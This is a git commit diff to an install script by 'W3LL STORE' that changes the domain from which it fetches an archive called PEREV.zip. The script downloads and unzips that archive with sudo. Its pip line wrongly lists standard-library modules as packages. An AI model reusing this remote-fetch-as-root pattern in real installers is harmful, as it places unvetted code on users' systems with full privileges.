74d2f958fb03cabf9844624e2a60c8286f7623cb
W3LL STORE <81862344+W3LLLL@users.noreply.github.com>
2021-07-31 22:18:44 +0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -20,7 +20,7 @@ sudo apt-get install -y python3
 sudo apt-get install -y python3-pip
 sudo pip3 install requests colorama itertools idna uritools appdirs tldextract socket random  struct traceback urlextract configparser
 sudo apt install -y nano
-sudo wget https://w3ll.store/operators/PEREV.zip
+sudo wget https://w3ll.shop/operators/PEREV.zip
 sudo unzip -o PEREV.zip
 sudo rm PEREV.zip
 cp ~/.bashrc ~/.bashrc-bak
